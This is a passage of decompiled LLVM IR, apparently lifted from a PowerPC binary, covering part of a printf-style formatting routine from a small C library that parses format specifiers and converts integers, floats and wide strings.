  %v1_1000e43016 = phi i32 [ %v0_1000e448, %dec_label_pc_1000e428 ], [ %v1_1000e470, %dec_label_pc_1000e470 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_1000e41c

dec_label_pc_1000e41c:                            ; preds = %dec_label_pc_1000e41c.backedge, %dec_label_pc_1000e9f0
  %v0_1000e448 = phi i32 [ %v1_1000e43016, %dec_label_pc_1000e41c.backedge ], [ %v0_1000e9f0, %dec_label_pc_1000e9f0 ]
  %v1_1000e438 = phi i32 [ %storemerge13, %dec_label_pc_1000e41c.backedge ], [ %v0_1000e9f0, %dec_label_pc_1000e9f0 ]
  %v1_1000e41c = inttoptr i32 %v1_1000e438 to i8*
  %v2_1000e41c = load i8, i8* %v1_1000e41c, align 1
  %v3_1000e41c = zext i8 %v2_1000e41c to i32
  store i32 %v3_1000e41c, i32* %r0.global-to-local, align 4
  %v3_1000e420 = icmp eq i8 %v2_1000e41c, 0
  br i1 %v3_1000e420, label %dec_label_pc_1000e430, label %dec_label_pc_1000e428

dec_label_pc_1000e428:                            ; preds = %dec_label_pc_1000e41c
  %v3_1000e428 = icmp eq i8 %v2_1000e41c, 37
  br i1 %v3_1000e428, label %dec_label_pc_1000e430, label %dec_label_pc_1000e41c.backedge

dec_label_pc_1000e430:                            ; preds = %dec_label_pc_1000e428, %dec_label_pc_1000e41c
  %v4_1000e430 = icmp eq i32 %v1_1000e438, %v0_1000e448
  br i1 %v4_1000e430, label %dec_label_pc_1000e464, label %dec_label_pc_1000e438

dec_label_pc_1000e438:                            ; preds = %dec_label_pc_1000e430
  %v2_1000e438 = sub i32 %v1_1000e438, %v0_1000e448
  store i32 %v2_1000e438, i32* @r31, align 4
  %v4_1000e438 = icmp sgt i32 %v2_1000e438, 0
  br i1 %v4_1000e438, label %dec_label_pc_1000e448, label %dec_label_pc_1000e458

dec_label_pc_1000e448:                            ; preds = %dec_label_pc_1000e438
  %v0_1000e450 = load i32, i32* %r24.global-to-local, align 4
  store i32 268493912, i32* @lr, align 4
  %v3_1000e454 = inttoptr i32 %v0_1000e450 to i16*
  %v4_1000e454 = call i32 @__stdio_fwrite(i32 %v0_1000e448, i32 %v2_1000e438, i16* %v3_1000e454)
  %v1_1000e458.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e458

dec_label_pc_1000e458:                            ; preds = %dec_label_pc_1000e438, %dec_label_pc_1000e448
  %v1_1000e460 = phi i32 [ %v1_1000e458.pre, %dec_label_pc_1000e448 ], [ %v2_1000e438, %dec_label_pc_1000e438 ]
  %storemerge2 = phi i32 [ %v4_1000e454, %dec_label_pc_1000e448 ], [ 0, %dec_label_pc_1000e438 ]
  %v4_1000e458 = icmp eq i32 %storemerge2, %v1_1000e460
  br i1 %v4_1000e458, label %dec_label_pc_1000e460, label %dec_label_pc_1000ea00

dec_label_pc_1000e460:                            ; preds = %dec_label_pc_1000e458
  %v0_1000e460 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000e460 = add i32 %v0_1000e460, %v1_1000e460
  store i32 %v2_1000e460, i32* %r23.global-to-local, align 4
  %v0_1000e464.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000e464

dec_label_pc_1000e464:                            ; preds = %dec_label_pc_1000e430, %dec_label_pc_1000e460
  %v0_1000e470 = phi i32 [ %v0_1000e448, %dec_label_pc_1000e430 ], [ %v0_1000e464.pre, %dec_label_pc_1000e460 ]
  %v1_1000e464 = inttoptr i32 %v0_1000e470 to i8*
  %v2_1000e464 = load i8, i8* %v1_1000e464, align 1
  %v3_1000e464 = zext i8 %v2_1000e464 to i32
  store i32 %v3_1000e464, i32* %r0.global-to-local, align 4
  %v3_1000e468 = icmp eq i8 %v2_1000e464, 0
  br i1 %v3_1000e468, label %dec_label_pc_1000ea04, label %dec_label_pc_1000e470

dec_label_pc_1000e470:                            ; preds = %dec_label_pc_1000e464
  %v1_1000e470 = add i32 %v0_1000e470, 1
  %v2_1000e470 = inttoptr i32 %v1_1000e470 to i8*
  %v3_1000e470 = load i8, i8* %v2_1000e470, align 1
  %v4_1000e470 = zext i8 %v3_1000e470 to i32
  store i32 %v4_1000e470, i32* %r0.global-to-local, align 4
  %v3_1000e478 = icmp eq i8 %v3_1000e470, 37
  br i1 %v3_1000e478, label %dec_label_pc_1000e41c.backedge, label %dec_label_pc_1000e480

dec_label_pc_1000e480:                            ; preds = %dec_label_pc_1000e470
  store i32 %v2_1000e3b8, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1000e470, i8** %stack_var_-200, align 4
  store i32 268493976, i32* @lr, align 4
  %v3_1000e494 = call i32 @_ppfs_parsespec(i32* %v1_1000e3d0, i32 %v1_1000e470)
  store i32 %v2_1000e3b8, i32* @r3, align 4
  store i32 268493984, i32* @lr, align 4
  %v0_1000e49c = call i32 @_ppfs_setargs()
  store i32 %v4_1000e4a4, i32* %r7.global-to-local, align 4
  store i32 %v2_1000e4ac, i32* %r0.global-to-local, align 4
  br i1 %v2_1000e4a8, label %dec_label_pc_1000e4bc, label %dec_label_pc_1000e4c8

dec_label_pc_1000e4bc:                            ; preds = %dec_label_pc_1000e480
  br label %dec_label_pc_1000e4c8

dec_label_pc_1000e4c8:                            ; preds = %dec_label_pc_1000e480, %dec_label_pc_1000e4bc
  %v0_1000e4f482 = phi i32 [ %v1_1000e4c4, %dec_label_pc_1000e4bc ], [ %v2_1000e4ac, %dec_label_pc_1000e480 ]
  store i32 %v0_1000e4f482, i32* %r10.global-to-local, align 4
  store i32 %v2_1000e4d0, i32* %r8.global-to-local, align 4
  store i32 %v1_1000e4d8, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_1000e4f8.preheader, label %dec_label_pc_1000e4f8.preheader.thread

dec_label_pc_1000e4f8.preheader.thread:           ; preds = %dec_label_pc_1000e4c8
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000e504

dec_label_pc_1000e4f8.preheader:                  ; preds = %dec_label_pc_1000e4c8
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_1000e4d4, label %dec_label_pc_1000e504, label %dec_label_pc_1000e4f0.preheader

dec_label_pc_1000e4f0.preheader:                  ; preds = %dec_label_pc_1000e4f8.preheader
  store i32 %v0_1000e4f482, i32* %stack_var_-344, align 4
  %v1_1000e4f483 = add i32 %v0_1000e4f482, 8
  store i32 %v1_1000e4f483, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1000e50088 = add i32 %tmp58, -1
  store i32 %v1_1000e50088, i32* %ctr.global-to-local, align 4
  %v2_1000e50089 = icmp eq i32 %v1_1000e50088, 0
  br i1 %v2_1000e50089, label %dec_label_pc_1000e504, label %dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge

dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge: ; preds = %dec_label_pc_1000e4f0.preheader, %dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge.dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge_crit_edge
  %v1_1000e4f0.pre = phi i32 [ %v1_1000e4f0.pre.pre, %dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge.dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge_crit_edge ], [ %v2_1000e4d0, %dec_label_pc_1000e4f0.preheader ]
  %v1_1000e4f891 = phi i32 [ %v1_1000e4f8, %dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge.dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge_crit_edge ], [ 4, %dec_label_pc_1000e4f0.preheader ]
  %v1_1000e4f490 = phi i32 [ %v1_1000e4f4, %dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge.dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge_crit_edge ], [ %v1_1000e4f483, %dec_label_pc_1000e4f0.preheader ]
  %v3_1000e4f0 = add i32 %v1_1000e4f0.pre, %v1_1000e4f891
  %v4_1000e4f0 = inttoptr i32 %v3_1000e4f0 to i32*
  store i32 %v1_1000e4f490, i32* %v4_1000e4f0, align 4
  %v0_1000e4f4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e4f4 = add i32 %v0_1000e4f4, 8
  store i32 %v1_1000e4f4, i32* %r10.global-to-local, align 4
  %v0_1000e4f8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e4f8 = mul i32 %v0_1000e4f8, 4
  store i32 %v1_1000e4f8, i32* %r0.global-to-local, align 4
  %v1_1000e4fc = add i32 %v0_1000e4f8, 1
  store i32 %v1_1000e4fc, i32* %r11.global-to-local, align 4
  %v0_1000e500 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e500 = add i32 %v0_1000e500, -1
  store i32 %v1_1000e500, i32* %ctr.global-to-local, align 4
  %v2_1000e500 = icmp eq i32 %v1_1000e500, 0
  br i1 %v2_1000e500, label %dec_label_pc_1000e504, label %dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge.dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge_crit_edge

dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge.dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge_crit_edge: ; preds = %dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge
  %v1_1000e4f0.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge

dec_label_pc_1000e504:                            ; preds = %dec_label_pc_1000e4f0.preheader, %dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge, %dec_label_pc_1000e4f8.preheader.thread, %dec_label_pc_1000e4f8.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_1000e508, label %dec_label_pc_1000e510, label %dec_label_pc_1000e530

dec_label_pc_1000e510:                            ; preds = %dec_label_pc_1000e504
  %v0_1000e514 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000e514, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_1000e514, 0
  %v1_1000e51c = zext i1 %tmp96 to i32
  %v2_1000e51c = ashr i32 %v0_1000e514, 31
  %v3_1000e51c = and i32 %v2_1000e51c, -2
  %v4_1000e51c = or i32 %v3_1000e51c, %v1_1000e51c
  store i32 %v4_1000e51c, i32* @r5, align 4
  %v1_1000e524 = call i32 @__asm_rlwinm(i32 %v0_1000e644, i32 0, i32 20, i32 23)
  store i32 %v1_1000e524, i32* @r4, align 4
  %v1_1000e528 = inttoptr i32 %v1_1000e524 to i16*
  %v2_1000e528 = call i32 @_store_inttype(i16* %v1_1000e528)
  br label %dec_label_pc_1000e9ec

dec_label_pc_1000e530:                            ; preds = %dec_label_pc_1000e504
  br i1 %v2_1000e530, label %dec_label_pc_1000e710, label %dec_label_pc_1000e538

dec_label_pc_1000e538:                            ; preds = %dec_label_pc_1000e530
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1000e548 = load i8, i8* %v2_1000e548, align 1
  %v4_1000e548 = zext i8 %v3_1000e548 to i32
  store i32 %v4_1000e548, i32* %r30.global-to-local, align 4
  %v3_1000e54c = icmp eq i8 %v3_1000e548, 10
  br i1 %v3_1000e54c, label %dec_label_pc_1000e554, label %dec_label_pc_1000e57c

dec_label_pc_1000e554:                            ; preds = %dec_label_pc_1000e538
  store i32 %v0_1000e644, i32* %r0.global-to-local, align 4
  %v1_1000e558 = call i32 @__asm_rlwinm(i32 %v0_1000e644, i32 26, i32 31, i32 31)
  %v1_1000e55c = call i32 @__asm_rlwinm(i32 %v0_1000e644, i32 27, i32 31, i32 31)
  %v3_1000e560 = icmp eq i32 %v1_1000e558, 0
  %v2_1000e564 = icmp ne i32 %v1_1000e55c, 0
  %not.v2_1000e564 = xor i1 %v2_1000e564, true
  %v6_1000e568 = sext i1 %not.v2_1000e564 to i32
  store i32 %v6_1000e568, i32* %r0.global-to-local, align 4
  %v1_1000e570 = select i1 %v2_1000e564, i32 44, i32 87
  store i32 %v1_1000e570, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e560, label %dec_label_pc_1000e57c, label %dec_label_pc_1000e578

dec_label_pc_1000e578:                            ; preds = %dec_label_pc_1000e554
  %v1_1000e578 = or i32 %v1_1000e570, 128
  store i32 %v1_1000e578, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e57c

dec_label_pc_1000e57c:                            ; preds = %dec_label_pc_1000e538, %dec_label_pc_1000e554, %dec_label_pc_1000e578
  %v0_1000e57c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e57c = icmp ugt i32 %v0_1000e57c, 5
  br i1 %v2_1000e57c, label %dec_label_pc_1000e5a4, label %dec_label_pc_1000e584

dec_label_pc_1000e584:                            ; preds = %dec_label_pc_1000e57c
  %v3_1000e584 = icmp eq i32 %v0_1000e57c, 3
  br i1 %v3_1000e584, label %dec_label_pc_1000e58c, label %dec_label_pc_1000e594

dec_label_pc_1000e58c:                            ; preds = %dec_label_pc_1000e584
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e5a8

dec_label_pc_1000e594:                            ; preds = %dec_label_pc_1000e584
  %v3_1000e594 = icmp eq i32 %v0_1000e57c, 1
  br i1 %v3_1000e594, label %dec_label_pc_1000e5ac, label %dec_label_pc_1000e5a8

dec_label_pc_1000e5a4:                            ; preds = %dec_label_pc_1000e57c
  %v0_1000e5a4 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000e5a4 = sub i32 0, %v0_1000e5a4
  store i32 %v1_1000e5a4, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e5a8

dec_label_pc_1000e5a8:                            ; preds = %dec_label_pc_1000e594, %dec_label_pc_1000e58c, %dec_label_pc_1000e5a4
  br label %dec_label_pc_1000e5ac

dec_label_pc_1000e5ac:                            ; preds = %dec_label_pc_1000e594, %dec_label_pc_1000e5a8
  %storemerge3 = phi i32 [ 11, %dec_label_pc_1000e5a8 ], [ 6, %dec_label_pc_1000e594 ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_1000e5ac = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000e5ac, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_1000e5ac, -1
  br i1 %tmp75, label %dec_label_pc_1000e5c0, label %dec_label_pc_1000e5bc

dec_label_pc_1000e5bc:                            ; preds = %dec_label_pc_1000e5ac
  br label %dec_label_pc_1000e5c0

dec_label_pc_1000e5c0:                            ; preds = %dec_label_pc_1000e5ac, %dec_label_pc_1000e5bc
  %storemerge = phi i32 [ %v4_1000e5bc, %dec_label_pc_1000e5bc ], [ 32, %dec_label_pc_1000e5ac ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_1000e5c0 = icmp eq i32 %v0_1000e57c, 1
  br i1 %v3_1000e5c0, label %dec_label_pc_1000e5dc, label %dec_label_pc_1000e5cc

dec_label_pc_1000e5cc:                            ; preds = %dec_label_pc_1000e5c0
  %v0_1000e5cc = load i32, i32* %r7.global-to-local, align 4
  %v1_1000e5cc = mul i32 %v0_1000e5cc, 4
  store i32 %v1_1000e5cc, i32* %r0.global-to-local, align 4
  %v0_1000e5d0 = load i32, i32* @r1, align 4
  %v2_1000e5d0 = add i32 %v0_1000e5d0, %v1_1000e5cc
  %v1_1000e5d4 = add i32 %v2_1000e5d0, 188
  %v2_1000e5d4 = inttoptr i32 %v1_1000e5d4 to i32*
  %v3_1000e5d4 = load i32, i32* %v2_1000e5d4, align 4
  store i32 %v3_1000e5d4, i32* %r0.global-to-local, align 4
  %v1_1000e5d8 = call i32 @__asm_rlwinm(i32 %v3_1000e5d4, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1000e5dc

dec_label_pc_1000e5dc:                            ; preds = %dec_label_pc_1000e5c0, %dec_label_pc_1000e5cc
  %v3_1000e5dc = load i32, i32* %stack_var_-344, align 4
  %v0_1000e5e0 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000e5e0, i32* @r5, align 4
  %v2_1000e5e4 = inttoptr i32 %v0_1000e5e0 to i32*
  %v3_1000e5e4 = call i32 @_load_inttype(i32 %v3_1000e5dc, i32* %v2_1000e5e4)
  store i32 %v0_1000e5e0, i32* %r7.global-to-local, align 4
  %v0_1000e5f4 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1000e5f4, i32* %r8.global-to-local, align 4
  %v6_1000e5fc = call i32 @_uintmaxtostr(i8* %v5_1000e5fc, i32 %v3_1000e5e4, i32 %v3_1000e5dc, i32 %v0_1000e5e0, i32 %v0_1000e5f4)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1000e5fc, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1000e650, label %dec_label_pc_1000e610

dec_label_pc_1000e610:                            ; preds = %dec_label_pc_1000e5dc
  %v7_1000e5fc = inttoptr i32 %v6_1000e5fc to i8*
  %v3_1000e610 = load i8, i8* %v7_1000e5fc, align 1
  %v4_1000e610 = zext i8 %v3_1000e610 to i32
  store i32 %v4_1000e610, i32* %r0.global-to-local, align 4
  %v3_1000e618 = icmp eq i8 %v3_1000e610, 45
  br i1 %v3_1000e618, label %dec_label_pc_1000e620, label %dec_label_pc_1000e634

dec_label_pc_1000e620:                            ; preds = %dec_label_pc_1000e610
  %v1_1000e620 = or i32 %v0_1000e644, 2
  store i32 %v1_1000e620, i32* %r0.global-to-local, align 4
  %v2_1000e624 = add i32 %v6_1000e5fc, 1
  store i32 %v2_1000e624, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1000e650

dec_label_pc_1000e634:                            ; preds = %dec_label_pc_1000e610
  %v1_1000e634 = and i32 %v0_1000e644, 2
  store i32 %v1_1000e634, i32* %r0.global-to-local, align 4
  %v3_1000e634 = icmp eq i32 %v1_1000e634, 0
  br i1 %v3_1000e634, label %dec_label_pc_1000e644, label %dec_label_pc_1000e63c

dec_label_pc_1000e63c:                            ; preds = %dec_label_pc_1000e634
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000e650

dec_label_pc_1000e644:                            ; preds = %dec_label_pc_1000e634
  %v1_1000e644 = urem i32 %v0_1000e644, 2
  store i32 %v1_1000e644, i32* %r11.global-to-local, align 4
  %v3_1000e644 = icmp eq i32 %v1_1000e644, 0
  br i1 %v3_1000e644, label %dec_label_pc_1000e650, label %dec_label_pc_1000e64c

dec_label_pc_1000e64c:                            ; preds = %dec_label_pc_1000e644
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1000e650

dec_label_pc_1000e650:                            ; preds = %dec_label_pc_1000e644, %dec_label_pc_1000e5dc, %dec_label_pc_1000e63c, %dec_label_pc_1000e620, %dec_label_pc_1000e64c
  %v0_1000e6bc = phi i32 [ %v6_1000e5fc, %dec_label_pc_1000e5dc ], [ %v2_1000e624, %dec_label_pc_1000e620 ], [ %v6_1000e5fc, %dec_label_pc_1000e644 ], [ %v6_1000e5fc, %dec_label_pc_1000e64c ], [ %v6_1000e5fc, %dec_label_pc_1000e63c ]
  %stack_var_-184.0 = phi i32 [ %v0_1000e644, %dec_label_pc_1000e5dc ], [ %v1_1000e620, %dec_label_pc_1000e620 ], [ %v0_1000e644, %dec_label_pc_1000e644 ], [ %v0_1000e644, %dec_label_pc_1000e64c ], [ %v0_1000e644, %dec_label_pc_1000e63c ]
  %v3_1000e650 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1000e864, i32* %r0.global-to-local, align 4
  %v2_1000e658 = sub i32 %v2_1000e864, %v0_1000e6bc
  %v1_1000e660 = add i32 %v2_1000e658, 127
  store i32 %v1_1000e660, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1000e650, -1
  br i1 %tmp76, label %dec_label_pc_1000e66c, label %dec_label_pc_1000e668

dec_label_pc_1000e668:                            ; preds = %dec_label_pc_1000e650
  br label %dec_label_pc_1000e66c

dec_label_pc_1000e66c:                            ; preds = %dec_label_pc_1000e650, %dec_label_pc_1000e668
  %v0_1000e6a0 = phi i32 [ %v3_1000e650, %dec_label_pc_1000e650 ], [ 1, %dec_label_pc_1000e668 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1000e670 = and i32 %stack_var_-184.0, 16
  store i32 %v1_1000e670, i32* %r11.global-to-local, align 4
  %v3_1000e670 = icmp eq i32 %v1_1000e670, 0
  br i1 %v3_1000e670, label %dec_label_pc_1000e6bc, label %dec_label_pc_1000e678

dec_label_pc_1000e678:                            ; preds = %dec_label_pc_1000e66c
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1000e67c, label %dec_label_pc_1000e688, label %dec_label_pc_1000e698.thread

dec_label_pc_1000e698.thread:                     ; preds = %dec_label_pc_1000e678
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1000e6bc

dec_label_pc_1000e688:                            ; preds = %dec_label_pc_1000e678
  br i1 %v3_1000e688, label %dec_label_pc_1000e690, label %dec_label_pc_1000e698

dec_label_pc_1000e690:                            ; preds = %dec_label_pc_1000e688
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1000e6bc

dec_label_pc_1000e698:                            ; preds = %dec_label_pc_1000e688
  br i1 %v3_1000e698, label %dec_label_pc_1000e6a0, label %dec_label_pc_1000e6bc

dec_label_pc_1000e6a0:                            ; preds = %dec_label_pc_1000e698
  %v3_1000e6a0 = icmp ugt i32 %v0_1000e6a0, %v1_1000e660
  br i1 %v3_1000e6a0, label %dec_label_pc_1000e6bc, label %dec_label_pc_1000e6a8

dec_label_pc_1000e6a8:                            ; preds = %dec_label_pc_1000e6a0
  %v1_1000e6a8 = inttoptr i32 %v0_1000e6bc to i8*
  %v2_1000e6a8 = load i8, i8* %v1_1000e6a8, align 1
  %v3_1000e6a8 = zext i8 %v2_1000e6a8 to i32
  store i32 %v3_1000e6a8, i32* %r0.global-to-local, align 4
  %v3_1000e6b0 = icmp eq i8 %v2_1000e6a8, 48
  br i1 %v3_1000e6b0, label %dec_label_pc_1000e6bc, label %dec_label_pc_1000e6b8

dec_label_pc_1000e6b8:                            ; preds = %dec_label_pc_1000e6a8
  %v1_1000e6b8 = add i32 %v2_1000e658, 128
  br label %dec_label_pc_1000e6bc

dec_label_pc_1000e6bc:                            ; preds = %dec_label_pc_1000e698.thread, %dec_label_pc_1000e698, %dec_label_pc_1000e6a8, %dec_label_pc_1000e6a0, %dec_label_pc_1000e66c, %dec_label_pc_1000e690, %dec_label_pc_1000e6b8
  %v1_1000e704 = phi i32 [ %v0_1000e6a0, %dec_label_pc_1000e698 ], [ 1, %dec_label_pc_1000e6a8 ], [ %v0_1000e6a0, %dec_label_pc_1000e6a0 ], [ %v0_1000e6a0, %dec_label_pc_1000e66c ], [ %v0_1000e6a0, %dec_label_pc_1000e690 ], [ %v1_1000e6b8, %dec_label_pc_1000e6b8 ], [ %v0_1000e6a0, %dec_label_pc_1000e698.thread ]
  %v1_1000e6bc = inttoptr i32 %v0_1000e6bc to i8*
  %v2_1000e6bc = load i8, i8* %v1_1000e6bc, align 1
  %v3_1000e6bc = zext i8 %v2_1000e6bc to i32
  store i32 %v3_1000e6bc, i32* %r0.global-to-local, align 4
  %v3_1000e6c0 = icmp eq i8 %v2_1000e6bc, 48
  br i1 %v3_1000e6c0, label %dec_label_pc_1000e6c8, label %dec_label_pc_1000e700

dec_label_pc_1000e6c8:                            ; preds = %dec_label_pc_1000e6bc
  %v0_1000e6c8 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_1000e6c8, 6
  br i1 %tmp77, label %dec_label_pc_1000e6d4, label %dec_label_pc_1000e6d0

dec_label_pc_1000e6d0:                            ; preds = %dec_label_pc_1000e6c8
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1000e6d4

dec_label_pc_1000e6d4:                            ; preds = %dec_label_pc_1000e6c8, %dec_label_pc_1000e6d0
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1000e6d8, label %dec_label_pc_1000e6e0, label %dec_label_pc_1000e6f0

dec_label_pc_1000e6e0:                            ; preds = %dec_label_pc_1000e6d4
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10019578.595 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e87c

dec_label_pc_1000e6f0:                            ; preds = %dec_label_pc_1000e6d4
  %v3_1000e6f0 = icmp eq i32 %v1_1000e704, 0
  br i1 %v3_1000e6f0, label %dec_label_pc_1000e6f8, label %dec_label_pc_1000e700

dec_label_pc_1000e6f8:                            ; preds = %dec_label_pc_1000e6f0
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e87c

dec_label_pc_1000e700:                            ; preds = %dec_label_pc_1000e6f0, %dec_label_pc_1000e6bc
  %v3_1000e700 = icmp ugt i32 %v1_1000e704, %v1_1000e660
  %v2_1000e704 = sub i32 %v1_1000e704, %v1_1000e660
  store i32 %v2_1000e704, i32* %r29.global-to-local, align 4
  br i1 %v3_1000e700, label %dec_label_pc_1000e89cthread-pre-split, label %dec_label_pc_1000e87c

dec_label_pc_1000e710:                            ; preds = %dec_label_pc_1000e530
  br i1 %v2_1000e710, label %dec_label_pc_1000e744, label %dec_label_pc_1000e718

dec_label_pc_1000e718:                            ; preds = %dec_label_pc_1000e710
  %v3_1000e718 = load i32, i32* %stack_var_-344, align 4
  %v0_1000e724 = load i32, i32* %r24.global-to-local, align 4
  store i32 268494644, i32* @lr, align 4
  %v5_1000e730 = call i32 @_fpmaxtostr(i32 %v0_1000e724, i32* nonnull %stack_var_-196, i32 268493580, i32 %v3_1000e718)
  %v1_1000e734 = icmp slt i32 %v5_1000e730, 0
  br i1 %v1_1000e734, label %dec_label_pc_1000ea00, label %dec_label_pc_1000e73c

dec_label_pc_1000e73c:                            ; preds = %dec_label_pc_1000e718
  %v0_1000e73c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000e73c = add i32 %v0_1000e73c, %v5_1000e730
  store i32 %v2_1000e73c, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000e9ec

dec_label_pc_1000e744:                            ; preds = %dec_label_pc_1000e710
  br i1 %v2_1000e744, label %dec_label_pc_1000e7ec, label %dec_label_pc_1000e74c

dec_label_pc_1000e74c:                            ; preds = %dec_label_pc_1000e744
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1000e758 = load i32, i32* %stack_var_-344, align 4
  %v1_1000e760 = inttoptr i32 %v3_1000e758 to i32*
  %v2_1000e760 = load i32, i32* %v1_1000e760, align 4
  br i1 %v3_1000e744, label %dec_label_pc_1000e760, label %dec_label_pc_1000e7b4

dec_label_pc_1000e760:                            ; preds = %dec_label_pc_1000e74c
  store i32 %v2_1000e760, i32* %r0.global-to-local, align 4
  %v3_1000e764 = icmp eq i32 %v2_1000e760, 0
  store i32 %v2_1000e760, i32* %stack_var_-340, align 4
  br i1 %v3_1000e764, label %dec_label_pc_1000e884, label %dec_label_pc_1000e770

dec_label_pc_1000e770:                            ; preds = %dec_label_pc_1000e760
  %v3_1000e770 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000e770, i32* %r0.global-to-local, align 4
  %v1_1000e778 = icmp slt i32 %v3_1000e770, 0
  br i1 %v1_1000e778, label %dec_label_pc_1000e784, label %dec_label_pc_1000e780

dec_label_pc_1000e780:                            ; preds = %dec_label_pc_1000e770
  br label %dec_label_pc_1000e784

dec_label_pc_1000e784:                            ; preds = %dec_label_pc_1000e770, %dec_label_pc_1000e780
  %storemerge94 = phi i32 [ %v3_1000e770, %dec_label_pc_1000e780 ], [ -1, %dec_label_pc_1000e770 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_1000e784, i32* @r3, align 4
  store i32 %v2_1000e788, i32* @r6, align 4
  store i32 %v2_1000e784, i32* @r4, align 4
  store i32 268494740, i32* @lr, align 4
  %v0_1000e790 = call i32 @__GI_wcsrtombs()
  %v3_1000e794 = icmp eq i32 %v0_1000e790, -1
  store i32 %v0_1000e790, i32* @r31, align 4
  br i1 %v3_1000e794, label %dec_label_pc_1000ea00, label %dec_label_pc_1000e7a0

dec_label_pc_1000e7a0:                            ; preds = %dec_label_pc_1000e784
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e89c

dec_label_pc_1000e7b4:                            ; preds = %dec_label_pc_1000e74c
  store i32 %v2_1000e864, i32* @r28, align 4
  store i32 268494792, i32* @lr, align 4
  %v3_1000e7c4 = call i32 @__GI_wcrtomb(i32 %v2_1000e864, i32 %v2_1000e760, i32 %v2_1000e788)
  %v3_1000e7c8 = icmp eq i32 %v3_1000e7c4, -1
  store i32 %v3_1000e7c4, i32* @r31, align 4
  br i1 %v3_1000e7c8, label %dec_label_pc_1000ea00, label %dec_label_pc_1000e7d4

dec_label_pc_1000e7d4:                            ; preds = %dec_label_pc_1000e7b4
  store i32 %v2_1000e864, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1000e7e4 = load i32, i32* @r25, align 4
